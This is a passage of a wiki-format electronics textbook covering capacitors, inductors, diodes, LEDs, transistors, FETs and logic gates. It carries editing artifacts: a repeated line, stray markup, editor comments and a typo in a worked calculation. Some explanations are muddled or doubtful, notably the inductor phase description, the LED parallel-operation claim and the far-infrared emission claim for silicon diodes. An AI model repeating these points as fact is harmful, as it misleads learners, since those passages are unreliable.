&lt;center&gt;&lt;math&gt;\begin{matrix}F_{\mathrm{Coulomb}} &amp;=&amp; QE \\&amp;=&amp; (8\times10^{-19})(s\times10^5)\\&amp;=&amp; 1.6\times10^{-13}\mathrm{N}\end{matrix}&lt;/math&gt;&lt;/center&gt;

(c) Since &lt;math&gt;F_{up}&gt;F_{down}&lt;/math&gt;, the drop accelerates upwards. 

(d) The Coulomb force can be decreased by decreasing the electric field strength between the plates. Since &lt;math&gt;E={V\over d}&lt;/math&gt;, this can be done either by increasing ''d'' or decreasing ''V''.</text>

== A capacitor ==

A capacitor is simply two conductors separated by a dielectric (insulator).
A capacitor (historically known as a &quot;condenser&quot;) is a device that stores energy in an electric field &lt;!-- by accumulating an internal imbalance of electric charge ((Is there a better way to explain this ?)) --&gt;.

The most common kind of capacitor has two parallel plates with
a (fairly) uniform electric field between the plates.

A battery can be used to fill one end of the capacitor with electrons and drain electrons from the other end of the capacitor.
This is known as charging.
Charging a capacitor creates a charge imbalance between the two plates and creates a voltage that stops the capacitor from
charging.
When capacitors are connected to a battery, current flows only until the capacitor becomes charged to the same voltage as the battery.
When the capacitor is charged to the same voltage as the battery, current stops flowing -- the capacitor acts like an open circuit.
It is as if the capacitor gained infinite resistance.

If we pull a capacitor out of the circuit, it retains the voltage to which it was charged.
(In real capacitors, the excess electrons on one plate slowly leak over to the other plate.
But the higher the quality of the capacitor, the closer it acts like an &quot;ideal capacitor&quot;.
An &quot;ideal capacitor&quot; would hold that charge forever.
)

Just as the capacitor charges it can be discharged.

== An inductor ==

If we are going to talk of inductive circuits we need a definition of a inductor.

An inductor is simply a coil of wire (or some other conductive material).
An inductor is a device which stores energy in a magnetic field.

An inductor only resists changes in current. An ideal inductor does not offer any resistance to direct current, except when the current is switched on and off, in which case it makes the change more gradual. However, all real-world inductors are constructed from material with finite electrical resistance, which opposes even direct current.
&lt;!-- Is the above *functional* explaination adequate,
or do we need to delve into magnetic fields etc. ?
--&gt;

Whenever current flows, it creates a magnetic field proportional to the current.
(In other words, whenever electrons move, they create a magnetic field --
proportional to both how many electrons there are, and how fast their average speed is).
Coiling the wire concentrates that field inside the coil.

A changing magnetic field always induces a voltage in any wire.

When we apply a voltage source to the inductor --
for example, when we energize the field winding of an electric fan by plugging it in --
the current will flow through the coil,
creating a magnetic field.

As more and more current flows, the magnetic field also ''increases'' proportionally.
The changing magnetic field creates a &quot;back-emf&quot; (the voltage across the coil).
That same wire, when straightened out, would act like a short circuit --
but when formed into a coil, much less current goes through it.

If we applied a constant DC voltage to this coil, the current would keep increasing more and more, until something failed.

As you know, the voltage supplied by the wall socket isn't DC. It returns to zero then increases in the opposite direction many times a second.

When the voltage returns to zero, the current through the inductor stays constant --
the constant current causes a constant magnetic field,
the constant magnetic field causes zero &quot;back-emf&quot;.
When the supply voltage reverses direction,
the current through the coil decreases,
causing the magnetic field to decrease.
Because the magnetic field is ''decreasing'',
it induces a &quot;back-emf&quot; voltage across the inductor
in the opposite direction than when the magnetic field was ''increasing''.
(Something interesting happens after the magnetic field decreases all the way to zero,
but we don't have time to talk about that).

To summarize, at first, the current through the coil goes from + to -, just like a resistor or a charging capacitor. But just after the voltage reverses, the current continues going in the same direction, which is now - to +. This makes inductors unlike any other component known to mankind. We say that &quot;in an inductor, the voltage leads the current&quot; or ELI.

&lt;!--
&quot;but we have learnt that a changing magnetic field induces a current in a wire.&quot;
&quot;So when the current turns off the magnetic field
decreases inducing another current in the wire. As the field decreases in strength so does the induced magnetic field.&quot;
Gaa -- who writes this stuff ?
A changing magnetic field induces a *voltage* in a wire.
Let's try to get it right, people.
--&gt;

Normally inductors are made of copper wire, but not always (Example: aluminum wire, or spiral pattern etched on circuit board). The
material around and within the coil affects its properties  common types are air-core (only a coil of wire), iron-core, and ferrite
core. Iron and ferrite types are more efficient because they conduct the magnetic field much better than air.
Ferrite is more
efficient than iron because stray electricity cannot flow through it.

{| 
|- 
|[[Image:fhsst_magnify.png|110px]]
|Some inductors have more than a core, which is just a rod the coil is formed about. Some are formed like transformers, using two E-shaped 
pieces facing each other, the wires wound about the central leg of the E's. The E's are made of laminated iron/steel or ferrite.

pieces facing each other, the wires wound about the central leg of the E's. The E's are made of laminated iron/steel or ferrite.

Important qualities of an inductor:

There are several important properties for an inductor.

* Current carrying capacity is determined by wire thickness.
* Q, or quality, is determined by the uniformity of the windings, as well as the core material and how thoroughly it surrounds the coil.
* Last but not least, the inductance of the coil.

The inductance is determined by several factors.

* coil shape: short and squat is best
* core material
* windings: winding in opposite directions will cancel out the inductance effect, and you will have only a resistor.

== A comparison of capacitors and inductors ==

* In capacitors, current leads voltage.
* In inductors, voltage leads current.

I remember this by saying &quot;ELI the ICE man&quot;.

== Diode ==

A diode functions as the electronic version of a one-way valve. By restricting the direction of movement of charge carriers, it allows
an electric current to flow in one direction, but blocks it in the opposite direction. It is a one-way street for current.

[[Image:fhsst_diodesym.png|diodesym.png]]

[[Image:fhsst_diode.png|diode.png]]

Diode behavior is analogous to the behavior of a hydraulic device called a check valve. A check valve allows fluid flow through it in
one direction only:

[[Image:fhsst_checkvalve.png|checkvalve.png]]

Check valves are essentially pressure-operated devices: they open and allow flow if the pressure across them is of the correct
&quot;polarity&quot; to open the gate (in the analogy shown, greater fluid pressure on the right than on the left). If the pressure is of the
opposite &quot;polarity,&quot; the pressure difference across the check valve will close and hold the gate so that no flow occurs.

Like check valves, diodes are essentially &quot;pressure-&quot; operated (voltage-operated) devices. The essential difference between
forward-bias and reverse-bias is the polarity of the voltage dropped across the diode. Let's take a closer look at the simple
battery-diode-lamp circuit shown earlier, this time investigating voltage drops across the various components:

[[Image:fhsst_diodeexplanation.png|diodeexplanation.png]]

When the diode is forward-biased and conducting current, there is a small voltage dropped across it, leaving most of the battery voltage
dropped across the lamp. When the battery's polarity is reversed and the diode becomes reverse-biased, it drops all of the battery's
voltage and leaves none for the lamp. If we consider the diode to be a sort of self-actuating switch (closed in the forward-bias mode and
open in the reverse-bias mode), this behavior makes sense. The most substantial difference here is that the diode drops a lot more
voltage when conducting than the average mechanical switch (0.7 volts versus tens of millivolts).

This forward-bias voltage drop exhibited by the diode is due to the action of the depletion region formed by the P-N junction under the
influence of an applied voltage. When there is no voltage applied across a semiconductor diode, a thin depletion region exists around
the region of the P-N junction, preventing current through it. The depletion region is for the most part devoid of available charge
carriers and so acts as an insulator:

== LED ==

A light-emitting diode (LED) is a semiconductor device that emits light when charge flows in the correct direction through it. If you
apply a voltage to force current to flow in the direction the LED allows it will light up.

[[Image:fhsst_ledsym.png|ledsym.png]]

This notation of having two small arrows pointing away from the device is common to the schematic symbols of all light-emitting
semiconductor devices. Conversely, if a device is light-activated (meaning that incoming light stimulates it), then the symbol will
have two small arrows pointing toward it. It is interesting to note, though, that LEDs are capable of acting as light-sensing devices:
they will generate a small voltage when exposed to light, much like a solar cell on a small scale. This property can be gainfully
applied in a variety of light-sensing circuits. 

The color depends on the semiconducting material used to construct the LED, and can be in the near-ultraviolet, visible or infrared
part of the electromagnetic spectrum.

=== Physical function ===

Because LEDs are made of different chemical substances than normal rectifying diodes, their forward voltage drops will be different.
Typically, LEDs have much larger forward voltage drops than rectifying diodes, anywhere from about 1.6 volts to over 3 volts,
depending on the color. Typical operating current for a standard-sized LED is around 20 mA. When operating an LED from a DC
voltage source greater than the LED's forward voltage, a series-connected &quot;dropping&quot; resistor must be included to prevent
full source voltage from damaging the LED. Consider this example circuit:

[[Image:fhsst_ledusage1.png|ledusage1.png]]

With the LED dropping 1.6 volts, there will be 4.4 volts dropped across the resistor. Sizing the resistor for an LED current of 20 mA
is as simple as taking its voltage drop (4.4 volts) and dividing by circuit current (20 mA), in accordance with Ohm's Law (''R'' = ''E''/''I''). This
gives us a figure of 220 &amp;Omega;. Calculating power dissipation for this resistor, we take its voltage drop and multiply by its current
(P=IE), and end up with 88 mW, well within the rating of a 1/8 watt resistor. Higher battery voltages will require larger-value dropping
resistors, and possibly higher-power rating resistors as well. Consider this example for a supply voltage of 24 volts:


[[Image:fhsst_ledusage2.png|ledusage2.png]]

Here, the dropping resistor must be increased to a size of 1.12 k&amp;Omega; in order to drop 22.4 volts at 20 mA so that the LED still receives
only 1.6 volts. This also makes for a higher resistor power dissipation: 448 mW, nearly one-half a watt of power! Obviously, a
resistor rated for 1/8 watt power dissipation or even 1/4 watt dissipation will overheat if used here.

Dropping resistor values need not be precise for LED circuits. Suppose we were to use a 1 k&amp;Omega; resistor instead of a 1.12 k&amp;Omega; resistor
in the circuit shown above. The result would be a slightly greater circuit current and LED voltage drop, resulting in a brighter light
from the LED and slightly reduced service life. A dropping resistor with too much resistance (say, 1.5 k&amp;Omega; instead of 1.12 k&amp;Omega;) will
result in less circuit current, less LED voltage, and a dimmer light. LEDs are quite tolerant of variation in applied power, so you
need not strive for perfection in sizing the dropping resistor.

Also because of their unique chemical makeup, LEDs have much, much lower peak-inverse voltage (PIV) ratings than ordinary rectifying
diodes. A typical LED might only be rated at 5 volts in reverse-bias mode. Therefore, when using alternating current to power an LED, you
should connect a protective rectifying diode in series with the LED to prevent reverse breakdown every other half-cycle:

[[Image:fhsst_ledusage3.png|ledusage3.png]]

=== Light emission ===

The wavelength of the light emitted, and therefore its color, depends on the materials forming the pn junction. A normal diode,
typically made of silicon or germanium, emits invisible far-infrared light (so it can't be seen), but the materials used for an LED have
emit light corresponding to near-infrared, visible or near-ultraviolet frequencies.

=== Considerations in use ===

Unlike incandescent light bulbs, which can operate with either AC or DC, LEDs require a DC supply of the correct electrical polarity.
When the voltage across the pn junction is in the correct direction, a significant current flows and the device is said to be forward
biased. The voltage across the LED in this case is fixed for a given LED and is proportional to the energy of the emitted photons. If the
voltage is of the wrong polarity, the device is said to be reverse biased, very little current flows, and no light is emitted.

Because the voltage versus current characteristics of an LED are much like any diode, they can be destroyed by connecting them to a
voltage source much higher than their turn on voltage.

The voltage drop across a forward biased LED increases as the amount of light emitted increases because of the optical power being radiated. One
consequence is that LEDs of the same type can be readily operated in parallel. The turn-on voltage of an LED is a function of the color,
a higher forward drop is associated with emitting higher energy (bluer) photons. The reverse voltage that most LEDs can sustain
without damage is usually only a few volts. Some LED units contain two diodes, one in each direction and each a different color
(typically red and green), allowing two-color operation or a range of colors to be created by altering the percentage of time the
voltage is in each polarity.

=== LED materials ===

LED development began with infrared and red devices made with gallium arsenide. Advances in materials science have made possible
the production of devices with ever shorter wavelengths, producing light in a variety of colors.

Conventional LEDs are made from a variety of inorganic minerals, producing the following colors:

* aluminium gallium arsenide ''(AlGaAs)'': red and infrared
* gallium arsenide/phosphide ''(GaAsP)'': red, orange-red, orange, and yellow
* gallium nitride ''(GaN)'': green, pure green (or emerald green), and blue
* gallium phosphide ''(GaP)'': red, yellow and green
* zinc selenide ''(ZnSe)'': blue
* indium gallium nitride ''(InGaN)'': bluish-green and blue
* silicon carbide ''(SiC)'': blue
* diamond ''(C)'': ultraviolet
* silicon ''(Si)'' - under development

'''Note to self:''' The above list is taken from public sources, but at least one LED given as blue does not produce blue light. (There is a good
chance that almost none do, because of the higher frequency of blue.) This is a common problem in daily life due to the majority of
mankind being ignorant of colour theory and conflating blue with light blue with cyan, the latter often called &quot;sky blue&quot;. A cyan LED
may be distinguished from a blue LED in that adding a yellow phosphor to the output makes green, rather than white light. And
often aqua is called blue-green when in actuality the latter is cyan, and light cyan-green would be aqua. What adds to the confusion
is that cyan LEDs are enclosed in blue plastic. A great amount of work is needed to dispel these intuitive myths of colour mixing
before accurate descriptions of physical phenomena and their production can happen. - This needs to be sorted out 

=== Blue and white LEDs and Other colors ===

Commercially viable blue LEDs based invented by Shuji Nakamura while working in Japan at Nichia Corporation in 1993 and became widely
available in the late 1990s. They can be added to existing red and green LEDs to produce white light.

Most &quot;white&quot; LEDs in production today use a 450nm &amp; 470nm blue GaN (gallium nitride) LED covered by a yellowish phosphor coating
usually made of cerium doped yttrium aluminium garnet (YAG:Ce) crystals which have been powdered and bound in a type of viscous
adhesive. The LED chip emits blue light, part of which is converted to yellow by the YAG:Ce. The single crystal form of YAG:Ce is
actually considered a scintillator rather than a phosphor. Since yellow light stimulates the red and green receptors of the eye, the
resulting mix of blue and yellow light gives the appearance of white.

The newest method used to produce white light LEDs uses no phosphors at all and is based on homoepitaxially grown zinc selenide (ZnSe) on
a ZnSe substrate which simultaneously emits blue light from its active region and yellow light from the substrate.


=== Other colors ===

Recent color developments include pink and purple. They consist of one or two phosphor layers over a blue LED chip. The first phosphor
layer of a pink LED is a yellow glowing one, and the second phosphor layer is either red or orange glowing. Purple LEDs are blue LEDs
with an orange glowing phosphor over the chip. Some pink LEDs have run into issues. For example, some are blue LEDs painted with
fluorescent paint or fingernail polish that can wear off, and some are white LEDs with a pink phosphor or dye that unfortunately fades
after a short tme.

Ultraviolet, blue, pure green, white, pink and purple LEDs are relatively expensive compared to the more common reds, oranges,
greens, yellows and infrareds and are thus less commonly used in commercial applications.

The semiconducting chip is encased in a solid plastic lens, which is much tougher than the glass envelope of a traditional light bulb or
tube. The plastic may be colored, but this is only for cosmetic reasons and does not affect the color of the light emitted.

=== Operational parameters and efficiency ===

Most typical LEDs are designed to operate with no more than 30-60 milliwatts of electrical power. It is projected that by 2005,
10-watt units will be available. These devices will produce about as much light as a common 50-watt incandescent bulb, and will
facilitate use of LEDs for general illumination needs.

|In September 2003 a new type of blue LED was demonstrated by the company Cree, Inc. to have 35% efficiency at 20 mA. This produced a commercially packaged white light having 65 lumens per watt at 20 mA, becoming the brightest white LED commercially available at the time.

=== Organic light-emitting diodes (OLEDs) ===

If the emissive layer material of an LED is an organic compound, it is known as an Organic Light Emitting Diode (OLED). To function as a
semiconductor, the organic emissive material must have conjugated pi bonds. The emissive material can be a small organic molecule in a
crystalline phase, or a polymer. Polymer materials can be flexible such LEDs are known as PLEDs or FLEDs.

Compared with regular LEDs, OLEDs are lighter and polymer LEDs can have the added benefit of being flexible. Some possible future
applications of OLEDs could be:

* Light sources
* Wall decorations
* Luminous cloth
* Computer screens
* Televisions

=== LED applications ===

Here is a list of known applications for LEDs, some of which are further elaborated upon in the following text:

* in general, commonly used as information indicators in various types of embedded systems (many of which are listed below)
* thin, lightweight message displays, e.g. in public information signs (at airports and railway stations, among other places)
* status indicators, e.g. on/off lights on professional instruments and consumers audio/video equipment
* infrared LEDs in remote controls (for TVs, VCRs, etc.)
* clusters in traffic signals, replacing ordinary bulbs behind colored glass
* car indicator lights and bicycle lighting  also for pedestrians to be seen by car traffic
* calculator and measurement instrument displays (seven segment displays), although now mostly replaced by LCDs
* red or yellow LEDs are used in indicator and [alpha]numeric displays in environments where night vision must be retained: aircraft cockpits, submarine and ship bridges, astronomy observatories, and in the field, e.g. night time animal watching and military field use
* red or yellow LEDs are also used in photographic darkrooms, for providing lighting which does not lead to unwanted exposure of the film
* illumination, e.g. flashlights (a.k.a. torches, UK), and backlights for LCD screens
* signaling/emergency beacons and strobes
* movement sensors, e.g. in mechanical and optical computer mice and trackballs
* in LED printers, e.g. high-end color printers

LEDs offer benefits in terms of maintenance and safety.

* The typical working lifetime of a device, including the bulb, is ten years, which is much longer than the lifetimes of most other light sources.
* LEDs fail by dimming over time, rather than the abrupt burn-out of incandescent bulbs.
* LEDs give off less heat than incandescent light bulbs and are less fragile than fluorescent lamps.
* Since an individual device is smaller than a centimetre in length, LED-based light sources used for illumination and outdoor signals are built using clusters of tens of devices.

Because they are monochromatic, LED lights have great power advantages over white lights where a specific color is required.
Unlike the white lights, the LED does not need a filter that absorbs most of the emitted white light. Colored fluorescent lights are
made, but they are not widely available. LED lights are inherently colored, and are available in a wide range of colors. One of the
most recently introduced colors is the emerald green (bluish green, about 500 nm) that meets the legal requirements for traffic signals
and navigation lights.

There are applications that specifically require light that does not contain any blue component. Examples are photographic darkroom safe
lights, illumination in laboratories where certain photo-sensitive chemicals are used, and situations where dark adaptation (night
vision) must be preserved, such as cockpit and bridge illumination, observatories, etc. Yellow LED lights are a good choice to meet
these special requirements because the human eye is more sensitive to yellow light.

== Transistor ==

The transistor is a solid state semiconductor device used for amplification and switching, and has three terminals. The transistor
itself does not amplify current though, which is a common misconception, but a small current or voltage applied to one
terminal controls the current through the other two, hence the term transistor  a voltage- or current-controlled resistor. ''It is
the key component in all modern electronics''. In digital circuits, transistors are used as very fast electrical switches, and
arrangements of transistors can function as logic gates, RAM-type memory and other devices. In analog circuits, transistors are
essentially used as amplifiers.

Transistor was also the common name in the sixties for a transistor radio, a pocket-sized portable radio that utilized transistors
(rather than vacuum tubes) as its active electronics. This is still one of the dictionary definitions of transistor.

[[Image:fhsst_bothtranistortypes.png|bothtranistortypes.png]]

The only functional difference between a PNP transistor and an NPN transistor is the proper biasing (polarity) of the junctions when
operating. For any given state of operation, the current directions and voltage polarities for each type of transistor are exactly
opposite each other.

Bipolar transistors work as current-controlled current regulators. In other words, they restrict the amount of current that can go
through them according to a smaller, controlling current. The main current that is controlled goes from collector to emitter, or from
emitter to collector, depending on the type of transistor it is (PNP or NPN, respectively). The small current that controls the main
current goes from base to emitter, or from emitter to base, once again depending on the type of transistor it is (PNP or NPN,
respectively). According to the confusing standards of semiconductor symbology, the arrow always points against the direction of electron
flow:

[[Image:fhsst_tranistorcurrents.png|tranistorcurrents.png]]

Bipolar transistors are called bipolar because the main flow of electrons through them takes place in two types of semiconductor
material: P and N, as the main current goes from emitter to collector (or vice versa). In other words, two types of charge
carriers - electrons and holes - comprise this main current through the transistor.

As you can see, the controlling current and the controlled current always mesh together through the emitter wire, and their electrons
always flow against the direction of the transistor's arrow. This is the first and foremost rule in the use of transistors: all currents
must be going in the proper directions for the device to work as a current regulator. The small, controlling current is usually
referred to simply as the base current because it is the only current that goes through the base wire of the transistor.
Conversely, the large, controlled current is referred to as the collector current because it is the only current that goes through
the collector wire. The emitter current is the sum of the base and collector currents, in compliance with Kirchhoff's Current Law.

If there is no current through the base of the transistor, it shuts off like an open switch and prevents current through the collector.
If there is a base current, then the transistor turns on like a closed switch and allows a proportional amount of current through
the collector. Collector current is primarily limited by the base current, regardless of the amount of voltage available to push it.
The next section will explore in more detail the use of bipolar transistors as switching elements.

=== Importance ===

The transistor is considered by many to be one of the greatest discoveries or inventions in modern history, ranking with banking
and the printing press. Key to the importance of the transistor in modern society is its ability to be produced in huge numbers using
simple techniques, resulting in vanishingly small prices. Computer &quot;chips&quot; consist of millions of transistors and sell for rands, with
per-transistor costs in the thousandths-of-cents.

The low cost has meant that the transistor has become an almost universal tool for non-mechanical tasks. Whereas a common device,
say a refrigerator, would have used a mechanical device for control, today it is often less expensive to simply use a few million
transistors and the appropriate computer program to carry out the same task through &quot;brute force&quot;. Today transistors have replaced
almost all electromechanical devices, most simple feedback systems, and appear in huge numbers in everything from computers to cars.

Hand-in-hand with low cost has been the increasing move to &quot;digitizing&quot; all information. With transistorized computers offering
the ability to quickly find (and sort) digital information, more and more effort was put into making all information digital. Today
almost all media in modern society is delivered in digital form, converted and presented by computers. Common &quot;analog&quot; forms of
information such as television or newspapers spend the vast majority of their time as digital information, being converted to analog only
for a small portion of the time.


== The transistor as a switch ==

Because a transistor's collector current is proportionally limited by its base current, it can be used as a sort of current-controlled
switch. A relatively small flow of electrons sent through the base of the transistor has the ability to exert control over a much
larger flow of electrons through the collector. Suppose we had a lamp that we wanted to turn on and off by means of 
a switch. Such a circuit would be extremely simple:

[[Image:fhsst_tasswitch.png|tasswitch.png]]

For the sake of illustration, let's insert a transistor in place of the switch to show how it can control the flow of electrons through
the lamp. Remember that the controlled current through a transistor must go between collector and emitter. Since it's the current
through the lamp that we want to control, we must position the collector and emitter of our transistor where the two contacts of
the switch are now. We must also make sure that the lamp's current will move against the direction of the emitter arrow symbol to
ensure that the transistor's junction bias will be correct: 

[[Image:fhsst_tasswitchnpn.png|tasswitchnpn.png]]

In this example I happened to choose an NPN transistor. A PNP transistor could also have been chosen for the job, and its
application would look like this:

[[Image:fhsst_tasswitchpnp.png|tasswitchpnp.png]]

The choice between NPN and PNP is really arbitrary. All that matters is that the proper current directions are maintained for the sake of
correct junction biasing (electron flow going against the transistor symbol's arrow).

Going back to the NPN transistor in our example circuit, we are faced with the need to add something more so that we can have base
current. Without a connection to the base wire of the transistor, base current will be zero, and the transistor cannot turn on,
resulting in a lamp that is always off. Remember that for an NPN transistor, base current must consist of electrons flowing from
emitter to base (against the emitter arrow symbol, just like the lamp current). Perhaps the simplest thing to do would be to connect
a switch between the base and collector wires of the transistor like this:

[[Image:fhsst_tasswitch1.png|tasswitch1.png]]

If the switch is open, the base wire of the transistor will be left &quot;floating&quot; (not connected to anything) and there will be no current
through it. In this state, the transistor is said to be cutoff. If the switch is closed, however, electrons will be able to flow from
the emitter through to the base of the transistor, through the switch and up to the left side of the lamp, back to the positive
side of the battery. This base current will enable a much larger flow of electrons from the emitter through to the collector, thus
lighting up the lamp. In this state of maximum circuit current, the transistor is said to be saturated.

[[Image:fhsst_tasswitch2.png|tasswitch2.png]]

Of course, it may seem pointless to use a transistor in this capacity to control the lamp. After all, we're still using a switch
in the circuit, aren't we? If we're still using a switch to control the lamp - if only indirectly - then what's the point of having a
transistor to control the current? Why not just go back to our original circuit and use the switch directly to control the lamp
current?

There are a couple of points to be made here, actually. First is the fact that when used in this manner, the switch contacts need only
handle what little base current is necessary to turn the transistor on, while the transistor itself handles the majority of the lamp's
current. This may be an important advantage if the switch has a low current rating: a small switch may be used to control a relatively
high-current load. Perhaps more importantly, though, is the fact that the current-controlling behavior of the transistor enables us
to use something completely different to turn the lamp on or off. Consider this example, where a solar cell is used to control the
transistor, which in turn controls the lamp:

[[Image:fhsst_tasswitchsolarcell.png|tasswitchsolarcell.png]]

Or, we could use a thermocouple to provide the necessary base current to turn the transistor on:

[[Image:fhsst_tasswitchthermocouple.png|tasswitchthermocouple.png]]

Even a microphone of sufficient voltage and current output could be used to turn the transistor on, provided its output is rectified
from AC to DC so that the emitter-base PN junction within the transistor will always be forward-biased:

[[Image:fhsst_tasswitchmicrophone.png|tasswitchmicrophone.png]]

The point should be quite apparent by now: any sufficient source of DC current may be used to turn the transistor on, and that source of
current need only be a fraction of the amount of current needed to energize the lamp. Here we see the transistor functioning not only
as a switch, but as a true amplifier: using a relatively low-power signal to control a relatively large amount of power. Please note
that the actual power for lighting up the lamp comes from the battery to the right of the schematic. It is not as though the small
signal current from the solar cell, thermocouple, or microphone is being magically transformed into a greater amount of power. Rather,
those small power sources are simply controlling the battery's power to light up the lamp.

=== Field-Effect Transistor (FET) ===

'''Note: Schematic can be found under GFDL on wikipedia'''

The schematic symbols for p- and n-channel MOSFETs. The symbols to the right include an extra terminal for the transistor body
(allowing for a seldom-used channel bias) whereas in those to the left the body is implicitly connected to the source.

The most common variety of field-effect transistors, the enhancement-mode MOSFET (metal-oxide semiconductor field-effect
transistor) consists of a unipolar conduction channel and a metal gate separated from the main conduction channel by a thin layer of
(SiO2) glass. This is why an alternative name for the FET is 'unipolar transistor.' When a potential difference (of the proper
polarity) is impressed across gate and source, charge carriers are introduced to the channel, making it conductive. The amount of this
current can be modulated, or (nearly) completely turned off, by varying the gate potential.

Because the gate is insulated, no DC current flows to or from the gate electrode. This lack of a gate current and the ability of the
MOSFET to act like a switch, allows particularly efficient digital circuits to be created, with very low power consumption at low
frequencies. The power consumption increases markedly with frequency, because the capacitive loading of the FET control
terminal takes more energy to slew at higher frequencies, in direct proportion to the frequency. Hence, MOSFETs have become the dominant
technology used in computing hardware such as microprocessors and memory devices such as RAM. Bipolar transistors are more rugged and
hence more useful for low-impedance loads and inductively reactive (e.g. motor) loads.

Power MOSFETs become less conductive with increasing temperature and can therefore be applied in shunt, to increase current capacity,
unlike the bipolar transistor, which has a negative temperature coefficient of resistance, and is therefore prone to thermal
runaway. The downside of this is that, while the power FET can protect itself from overheating by diminishing the current through
it, high temperatures need to be avoided by using a larger heat sink than for an equivalent bipolar device. Macroscopic FET power
transistors are actually composed of many little transistors. They are stacked (on-chip) to increase breakdown potential and paralleled
to reduce Ron, i.e. allowing for more current, bussing the gates to provide a single control (gate) terminal.

The depletion mode FET is a little different. It uses a back-biased diode for the control terminal, which presents a capacitive load to
the driving circuit in normal operation. With the gate tied to the source, a DFET is fully on. Changing the potential of a DFET
(pulling an N-channel gate downward, for example) will turn it off, i.e. 'deplete' the channel (drain-source) of charge carriers.
MOSFETs, formerly called IGFETs (for Insulated Gate Field-Effect Transistor) can be depletion-mode, enhancement-mode, or mixed-mode,
but are almost always enhancement mode in modern commercial practice. This means that, with the source and gate tied together
(thus equipotential) the channel will be off (high impedance or non-conducting). The n-channel device (reverse for P-channel), like
in the DFET, is turned on by raising the potential of the gate. Typically, the gate on a MOSFET will withstand +-20V, relative to
the source terminal. If one were to raise the gate potential of an n-channel device without limiting the current to a few milliamps,
one would destroy the gate diode, like any other small diode. Why do we typically think of n-channel devices as the default? In silicon
devices, the ones that use majority carriers that are electrons, rather than holes, are slightly faster and can carry more current
than their P-type counterparts. The same is true in GaAs devices.

The FET is simpler in concept than the bipolar transistor and can be constructed from a wide range of materials.

The most common use of MOSFET transistors today is the CMOS (complementary metallic oxide semiconductor) integrated circuit
which is the basis for most digital electronic devices. These use a totem-pole arrangement where one transistor (either the pull-up or
the pull-down) is on while the other is off. Hence, there is no DC drain, except during the transition from one state to the other,
which is very short. As mentioned, the gates are capacitive, and the charging and discharging of the gates each time a transistor
switches states is the primary cause of power drain. 

The C in CMOS stands for 'complementary.' The pull-up is a P-channel device (using holes for the mobile carrier of charge) and the
pull-down is N-channel (electron carriers). This allows busing of the control terminals, but limits the speed of the circuit to that
of the slower P device (in silicon devices). The bipolar solutions to push-pull include 'cascode' using a current source for the load.
Circuits that utilize both unipolar and bipolar transistors are called Bi-Fet. A recent development is called 'vertical P.'
Formerly, BiFet chip users had to settle for relatively poor (horizontal) P-type FET devices. This is no longer the case and
allows for quieter and faster analog circuits.

A clever variant of the FET is the dual-gate device. This allows for two opportunities to turn the device off, as opposed to the
dual-base (bipolar) transistor which presents two opportunities to turn the device on.

FETs can switch signals of either polarity, if their amplitude is significantly less than the gate swing, as the devices (especially
the parasitic diode-free DFET) are basically symmetrical. This means that FETs are the most suitable type for analog multiplexing. With
this concept, one can construct a solid-state mixing board, for example.

The power MOSFET has a 'parasitic diode' (back-biased) normally shunting the conduction channel that has half the current capacity
of the conduction channel. Sometimes this is useful in driving dual-coil magnetic circuits (for spike protection), but in other
cases it causes problems.

The high impedance of the FET gate makes it rather vulnerable to electrostatic damage, though this is not usually a problem after the
device has been installed.

A more recent device for power control is the insulated-gate bipolar transistor, or IGBT. This has a control structure akin to a MOSFET
coupled with a bipolar-like main conduction channel. These have become quite popular.</text>

= Electronic Logic Gates =

The simplest form of electronic logic is diode logic (DL). This allows AND and OR gates to be built, but not inverters, and so is an
incomplete form of logic. To built a complete logic system, valves or transistors can be used. The simplest family of logic gates using
bipolar transistors is called resistor-transistor logic, or RTL. Unlike diode logic gates, RTL gates can be cascaded indefinitely to
produce more complex logic functions. These gates were used in early integrated circuits. For higher speed, the resistors used in RTL
were replaced by diodes, leading to diode-transistor logic, or DTL. It was then discovered that one transistor could do the job of two
diodes in the space of one diode, so transistor-transistor logic, or TTL, was created. In some types of chip, to reduce size and power
consumption still further, the bipolar transistors were replaced with complementary field-effect transistors (MOSFETs), resulting in
complementary metal-oxide-semiconductor (CMOS) logic.

For small-scale logic, designers now use prefabricated logic gates from families of devices such as the TTL 7400 series invented by
Texas Instruments and the CMOS 4000 series invented by RCA, and their more recent descendants. These devices usually contain
transistors with multiple emitters, used to implement the AND function, which are not available as separate components.
Increasingly, these fixed-function logic gates are being replaced by programmable logic devices, which allow designers to pack a huge
number of mixed logic gates into a single integrated circuit. 

Electronic logic gates differ significantly from their relay-and-switch equivalents. They are much faster, consume much
less power, and are much smaller (all by a factor of a million or more in most cases). Also, there is a fundamental structural
difference. The switch circuit creates a continuous metallic path for current to flow (in either direction) between its input and its
output. The semiconductor logic gate, on the other hand, acts as a high-gain voltage amplifier, which sinks a tiny current at its input
and produces a low-impedance voltage at its output. It is not possible for current to flow between the output and the input of a
semiconductor logic gate.

Another important advantage of standardised semiconductor logic gates, such as the 7400 and 4000 families, is that they are
cascadable. This means that the output of one gate can be wired to the inputs of one or several other gates, and so on ad infinitum,
enabling the construction of circuits of arbitrary complexity without requiring the designer to understand the internal workings
of the gates.

In practice, the output of one gate can only drive a finite number of inputs to other gates, a number called the 'fanout limit', but
this limit is rarely reached in the newer CMOS logic circuits, as compared to TTL circuits. Also, there is always a delay, called the
'propagation delay', from a change an input of a gate to the corresponding change in its output. When gates are cascaded, the
total propagation delay is approximately the sum of the individual delays, an effect which can become a problem in high-speed circuits.

The US symbol for an AND gate is: AND symbol and the IEC symbol is AND symbol.

The US circuit symbol for an OR gate is: OR symbol and the IEC symbol is: OR symbol.

The US circuit symbol for a NOT gate is: NOT symbol and the IEC symbol is: NOT symbol.

In electronics a NOT gate is more commonly called an inverter. The circle on the symbol is called a bubble, and is generally used in
circuit diagrams to indicate an inverted input or output. 

The US circuit symbol for a NAND gate is: NAND symbol and the IEC symbol is: NAND symbol.

The US circuit symbol for a NOR gate is: NOR symbol and the IEC symbol is: NOR symbol.

In practice, the cheapest gate to manufacture is usually the NAND gate. Additionally, Charles Peirce showed that NAND gates alone (as
well as NOR gates alone) can be used to reproduce all the other logic gates.

Two more gates are the exclusive-OR or XOR function and its inverse, exclusive-NOR or XNOR. Exclusive-OR is true only when exactly one of
its inputs is true. In practice, these gates are built from combinations of simpler logic gates.

The US circuit symbol for an XOR gate is: XOR symbol and the IEC symbol is: XOR symbol</text>

= Counting circuits =

An arithmetic and logical unit (ALU) adder provides the basic functionality of arithmetic operations within a computer, and is a
